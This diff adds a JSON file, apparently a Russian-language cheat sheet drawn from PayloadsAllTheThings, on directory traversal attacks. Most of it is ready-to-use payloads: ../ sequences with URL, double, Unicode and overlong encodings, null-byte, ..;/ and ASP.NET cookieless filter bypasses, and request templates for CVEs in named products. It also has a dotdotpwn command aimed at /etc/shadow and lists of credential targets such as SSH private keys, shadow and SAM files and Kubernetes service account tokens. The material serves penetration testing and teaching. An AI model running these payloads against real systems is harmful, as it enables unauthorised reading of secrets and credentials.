@@ -1,0 +1,344 @@
+{
+  "category": "Directory Traversal",
+  "source": "PayloadsAllTheThings/Directory Traversal/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что это и где искать",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Path / Directory Traversal — уязвимость, когда приложение подставляет управляемый ввод в путь к файлу. Через последовательности ../ (dot-dot-slash) можно выйти из рабочей директории и прочитать произвольные файлы ФС.\n\nГде искать:\n• Параметры с именем файла: ?file=, ?page=, ?path=, ?template=, ?lang=, ?download=, ?img=.\n• Загрузка/выгрузка файлов, превью, экспорт, генерация отчётов.\n• Заголовки и cookie, которые мапятся на путь.\n\nОтличие от File Inclusion: здесь цель — ПРОЧИТАТЬ файл по пути (../../etc/passwd). LFI/RFI дополнительно ВЫПОЛНЯЕТ содержимое (php://, data://, include())."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Базовые конструкции и обходы фильтров",
+      "language": "text",
+      "tags": ["methodology", "bypass"],
+      "body": "Символами .. поднимаемся в родительский каталог. Ниже — варианты кодирования для обхода слабых фильтров:\n\n../\n..\\\n..\\/\n%2e%2e%2f\n%252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%uff0e%uff0e%u2215\n%uff0e%uff0e%u2216"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "dotdotpwn (wireghoul/dotdotpwn) — фаззер директори-traversal.\nIIS Short Name Scanner (irsdl/iis_shortname_scanner), shortscan (bitquark) — перебор коротких 8.3-имён в IIS.\nwindowsblindread (soffensive) — список интересных путей под Windows."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "dotdotpwn — пример запуска (FTP)",
+      "language": "bash",
+      "tags": ["tools", "fuzzing"],
+      "body": "perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b"
+    },
+
+    {
+      "subcategory": "Базовый ../",
+      "title": "Unix — классика ../../../etc/passwd",
+      "language": "text",
+      "tags": ["unix", "basic"],
+      "body": "../etc/passwd\n../../etc/passwd\n../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd\n../../../../../../etc/passwd\n../../../../../../../etc/passwd\n../../../../../../../../etc/passwd"
+    },
+    {
+      "subcategory": "Базовый ../",
+      "title": "Windows — обратный слеш ..\\",
+      "language": "text",
+      "tags": ["windows", "basic"],
+      "body": "..\\WINDOWS\\win.ini\n..\\..\\WINDOWS\\win.ini\n..\\..\\..\\WINDOWS\\win.ini\n..\\..\\..\\..\\WINDOWS\\win.ini\n..\\..\\..\\..\\..\\WINDOWS\\win.ini\n..\\..\\..\\..\\..\\..\\WINDOWS\\win.ini"
+    },
+    {
+      "subcategory": "Базовый ../",
+      "title": "Windows — обход через ../ к win.ini / drivers/etc/hosts",
+      "language": "text",
+      "tags": ["windows", "basic"],
+      "body": "../windows/system32/drivers/etc/hosts\n../../windows/system32/drivers/etc/hosts\n../../../windows/system32/drivers/etc/hosts\n../../../../windows/system32/drivers/etc/hosts\n../boot.ini\n../../boot.ini"
+    },
+
+    {
+      "subcategory": "Кодирование — URL",
+      "title": "Таблица URL-кодирования",
+      "language": "table",
+      "tags": ["encoding", "url"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Символ", "URL-код"],
+          "rows": [
+            [".", "%2e"],
+            ["/", "%2f"],
+            ["\\", "%5c"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Кодирование — URL",
+      "title": "URL-encode — пример (IPConfigure Orchid Core VMS 2.0.5)",
+      "language": "text",
+      "tags": ["encoding", "url"],
+      "body": "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd"
+    },
+    {
+      "subcategory": "Кодирование — double URL",
+      "title": "Таблица двойного URL-кодирования",
+      "language": "table",
+      "tags": ["encoding", "double-encode"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Символ", "Двойной URL-код"],
+          "rows": [
+            [".", "%252e"],
+            ["/", "%252f"],
+            ["\\", "%255c"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Кодирование — double URL",
+      "title": "Double-encode — пример (Spring MVC, CVE-2018-1271)",
+      "language": "text",
+      "tags": ["encoding", "double-encode", "cve"],
+      "body": "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini\n{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+    },
+    {
+      "subcategory": "Кодирование — Unicode",
+      "title": "Таблица 16-bit Unicode (%u…)",
+      "language": "table",
+      "tags": ["encoding", "unicode"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Символ", "Unicode-код"],
+          "rows": [
+            [".", "%u002e"],
+            ["/", "%u2215"],
+            ["\\", "%u2216"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Кодирование — Unicode",
+      "title": "Unicode — пример (Openfire Admin Console, CVE-2023-32315)",
+      "language": "text",
+      "tags": ["encoding", "unicode", "cve"],
+      "body": "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
+    },
+    {
+      "subcategory": "Кодирование — UTF-8 overlong",
+      "title": "Таблица overlong UTF-8",
+      "language": "table",
+      "tags": ["encoding", "utf8", "overlong"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Символ", "Варианты overlong-кодирования"],
+          "rows": [
+            [".", "%c0%2e, %e0%40%ae, %c0%ae"],
+            ["/", "%c0%af, %e0%80%af, %c0%2f"],
+            ["\\", "%c0%5c, %c0%80%5c"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Кодирование — UTF-8 overlong",
+      "title": "Что такое overlong UTF-8",
+      "language": "text",
+      "tags": ["encoding", "utf8", "overlong"],
+      "body": "По стандарту каждый codepoint кодируется минимально необходимым числом байт. Кодировка с лишними байтами (overlong) формально невалидна, но некоторые парсеры её принимают и нормализуют в обычный символ — это и обходит фильтр на ../"
+    },
+
+    {
+      "subcategory": "Обход фильтров — нерекурсивная чистка",
+      "title": "Mangled path — дублирование при удалении ../",
+      "language": "text",
+      "tags": ["bypass", "filter", "nested"],
+      "body": "Если WAF/фильтр вырезает ../ ОДИН раз (нерекурсивно) — вложи последовательности так, чтобы после вырезания снова получилось ../\n\n..././\n...\\.\\\n....//\n..../\\"
+    },
+    {
+      "subcategory": "Обход фильтров — нерекурсивная чистка",
+      "title": "Mangled path — пример (Mirasys DVMS <=5.12.6)",
+      "language": "text",
+      "tags": ["bypass", "filter"],
+      "body": "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini"
+    },
+    {
+      "subcategory": "Обход фильтров — null byte",
+      "title": "NULL-byte (%00) — обрезка расширения",
+      "language": "text",
+      "tags": ["bypass", "null-byte"],
+      "body": "Null-байт (%00, 0x00) — терминатор строки в C/C++. Если приложение дописывает расширение (например .htm), %00 обрезает строку до него и позволяет прочитать произвольный файл."
+    },
+    {
+      "subcategory": "Обход фильтров — null byte",
+      "title": "NULL-byte — пример (Homematic CCU3, CVE-2019-9726)",
+      "language": "text",
+      "tags": ["bypass", "null-byte", "cve"],
+      "body": "{{BaseURL}}/.%00./.%00./etc/passwd"
+    },
+    {
+      "subcategory": "Обход фильтров — null byte",
+      "title": "NULL-byte — пример с суффиксом (Kyocera d-COPIA253MF, CVE-2020-23575)",
+      "language": "text",
+      "tags": ["bypass", "null-byte", "cve"],
+      "body": "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm"
+    },
+    {
+      "subcategory": "Обход фильтров — reverse proxy",
+      "title": "..;/ — расхождение Nginx и Tomcat",
+      "language": "text",
+      "tags": ["bypass", "reverse-proxy", "tomcat"],
+      "body": "Nginx считает /..;/ обычной директорией, а Tomcat трактует его как /../ — это позволяет дотянуться до скрытых сервлетов за прокси.\n\n..;/"
+    },
+    {
+      "subcategory": "Обход фильтров — reverse proxy",
+      "title": "..;/ — пример (Pascom Cloud Phone System, CVE-2021-45967)",
+      "language": "text",
+      "tags": ["bypass", "reverse-proxy", "cve"],
+      "body": "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}"
+    },
+    {
+      "subcategory": "Обход фильтров — UNC / абсолютный путь",
+      "title": "UNC Share (Windows) — \\\\host\\share",
+      "language": "text",
+      "tags": ["bypass", "windows", "unc", "ntlm"],
+      "body": "Внедрение Windows UNC-пути (\\\\UNC\\share\\name) перенаправляет доступ к произвольному файлу или сетевому ресурсу. Дополнительно машина может аутентифицироваться на удалённой шаре, отправив NTLM-обмен (его можно перехватить/релеить).\n\n\\\\localhost\\c$\\windows\\win.ini"
+    },
+    {
+      "subcategory": "Обход фильтров — Java URL protocol",
+      "title": "Java new URL('') — префикс url:",
+      "language": "text",
+      "tags": ["bypass", "java", "ssrf"],
+      "body": "В Java при new URL('') поддерживается формат url:URL — можно подсунуть file:// или http:// внутреннему ресурсу.\n\nurl:file:///etc/passwd\nurl:http://127.0.0.1:8080"
+    },
+    {
+      "subcategory": "Обход фильтров — ASP.NET Cookieless",
+      "title": "ASP.NET cookieless — вставка (S(...)) в URL",
+      "language": "text",
+      "tags": ["bypass", "aspnet", "cookieless"],
+      "body": "При включённом cookieless session state ASP.NET встраивает Session ID прямо в URL: http://site/(S(lit3py55t21z5v55vlm25s55))/page.aspx. Эту вставку можно использовать для обхода фильтрации URL.\n\nПриложение в корне:\n/(S(X))/\n/(Y(Z))/\n/(G(AAA-BBB)D(CCC=DDD)E(0-1))/\n/(S(X))/admin/(S(X))/main.aspx\n/(S(x))/b/(S(x))in/Navigator.dll\n\nПриложение в подпапке:\n/MyApp/(S(X))/\n/admin/(S(X))/main.aspx\n/admin/Foobar/(S(X))/../(S(X))/main.aspx"
+    },
+    {
+      "subcategory": "Обход фильтров — ASP.NET Cookieless",
+      "title": "Версия .NET → формат URI вставки",
+      "language": "table",
+      "tags": ["aspnet", "cookieless"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Версия .NET", "URI"],
+          "rows": [
+            ["V1.0, V1.1", "/(XXXXXXXX)/"],
+            ["V2.0+", "/(S(XXXXXXXX))/"],
+            ["V2.0+", "/(A(XXXXXXXX)F(YYYYYYYY))/"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Обход фильтров — ASP.NET Cookieless",
+      "title": "CVE → payload (cookieless)",
+      "language": "table",
+      "tags": ["aspnet", "cookieless", "cve"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["CVE", "Payload"],
+          "rows": [
+            ["CVE-2023-36899", "/WebForm/(S(X))/prot/(S(X))ected/target1.aspx"],
+            ["-", "/WebForm/(S(X))/b/(S(X))in/target2.aspx"],
+            ["CVE-2023-36560", "/WebForm/pro/(S(X))tected/target1.aspx/(S(X))/"],
+            ["-", "/WebForm/b/(S(X))in/target2.aspx/(S(X))/"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Обход фильтров — IIS Short Name",
+      "title": "IIS Short Name — перебор 8.3-имён",
+      "language": "bash",
+      "tags": ["bypass", "iis", "windows"],
+      "body": "java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'\njava -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'\nshortscan http://example.org/"
+    },
+
+    {
+      "subcategory": "Глубокий traversal",
+      "title": "Готовые wordlist'ы для фаззинга глубины",
+      "language": "text",
+      "tags": ["fuzzing", "wordlist", "deep"],
+      "body": "Глубину traversal перебирают фаззером по словарю (1–8+ уровней ../) с разными кодировками одновременно. В PayloadsAllTheThings лежат готовые списки (Intruder/):\n\n• directory_traversal.txt — Windows win.ini / etc/passwd / .htaccess в plain, %5c/%2e-encoded и double-percent (%%35%63…) формах.\n• deep_traversal.txt — шаблоны на 1–8 уровней с плейсхолдером {FILE}: ../, ..;/, ..%2f, %2e%2e/ …\n• traversals-8-deep-exotic-encoding.txt — то же, ведущий /../, плюс double-encode %252f.\n• dotdotpwn.txt — комбинации ../ + типовые файлы (etc/passwd, etc/issue, boot.ini, drivers/etc/hosts).\n\nПодставь {FILE} = etc/passwd или windows/win.ini и гоняй по Intruder/ffuf."
+    },
+    {
+      "subcategory": "Глубокий traversal",
+      "title": "Шаблоны с плейсхолдером {FILE} (1–8 уровней)",
+      "language": "text",
+      "tags": ["fuzzing", "deep", "encoding"],
+      "body": "../{FILE}\n../../{FILE}\n../../../../../../../../{FILE}\n..;/{FILE}\n..;/..;/..;/{FILE}\n..%2f{FILE}\n..%2f..%2f..%2f{FILE}\n%2e%2e/{FILE}\n%2e%2e/%2e%2e/%2e%2e/{FILE}\n/../{FILE}\n/..%2f..%2f{FILE}\n/%2e%2e%2f%2e%2e%2f{FILE}\n/..%252f..%252f{FILE}"
+    },
+
+    {
+      "subcategory": "Интересные файлы — Linux",
+      "title": "ОС и информация о системе",
+      "language": "text",
+      "tags": ["linux", "files", "loot"],
+      "body": "/etc/issue\n/etc/group\n/etc/hosts\n/etc/motd\n/etc/passwd\n/etc/shadow"
+    },
+    {
+      "subcategory": "Интересные файлы — Linux",
+      "title": "/proc — процессы, окружение, версия",
+      "language": "text",
+      "tags": ["linux", "proc", "loot"],
+      "body": "/proc/[0-9]*/fd/[0-9]*   # первое число — PID, второе — file descriptor\n/proc/self/environ\n/proc/version\n/proc/cmdline\n/proc/sched_debug\n/proc/mounts"
+    },
+    {
+      "subcategory": "Интересные файлы — Linux",
+      "title": "/proc — сеть и текущий путь",
+      "language": "text",
+      "tags": ["linux", "proc", "network"],
+      "body": "/proc/net/arp\n/proc/net/route\n/proc/net/tcp\n/proc/net/udp\n/proc/self/cwd/index.php\n/proc/self/cwd/main.py"
+    },
+    {
+      "subcategory": "Интересные файлы — Linux",
+      "title": "Индексы locate (быстрый листинг ФС)",
+      "language": "text",
+      "tags": ["linux", "loot", "locate"],
+      "body": "/var/lib/mlocate/mlocate.db\n/var/lib/plocate/plocate.db\n/var/lib/mlocate.db"
+    },
+    {
+      "subcategory": "Интересные файлы — Linux",
+      "title": "Креды и история",
+      "language": "text",
+      "tags": ["linux", "creds", "loot"],
+      "body": "/etc/passwd\n/etc/shadow\n/home/$USER/.bash_history\n/home/$USER/.ssh/id_rsa\n/etc/mysql/my.cnf"
+    },
+    {
+      "subcategory": "Интересные файлы — Linux",
+      "title": "Kubernetes service account",
+      "language": "text",
+      "tags": ["linux", "kubernetes", "loot"],
+      "body": "/run/secrets/kubernetes.io/serviceaccount/token\n/run/secrets/kubernetes.io/serviceaccount/namespace\n/run/secrets/kubernetes.io/serviceaccount/certificate\n/var/run/secrets/kubernetes.io/serviceaccount"
+    },
+    {
+      "subcategory": "Интересные файлы — Windows",
+      "title": "Надёжные PoC-файлы (win.ini / license.rtf)",
+      "language": "text",
+      "tags": ["windows", "files", "poc"],
+      "body": "Файлы license.rtf и win.ini стабильно есть на современных Windows — удобны как proof-of-concept (содержимое не секретное, но факт чтения подтверждает уязвимость).\n\nC:\\Windows\\win.ini\nC:\\windows\\system32\\license.rtf"
+    },
+    {
+      "subcategory": "Интересные файлы — Windows",
+      "title": "Чувствительные пути (windowsblindread)",
+      "language": "text",
+      "tags": ["windows", "files", "loot"],
+      "body": "c:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/web.config\nc:/sysprep.inf\nc:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system32/inetsrv/metabase.xml\nc:/system volume information/wpsettings.dat\nc:/unattend.txt\nc:/unattend.xml\nc:/unattended.txt\nc:/unattended.xml\nc:/windows/repair/sam\nc:/windows/repair/system"
+    }
+  ]
+}
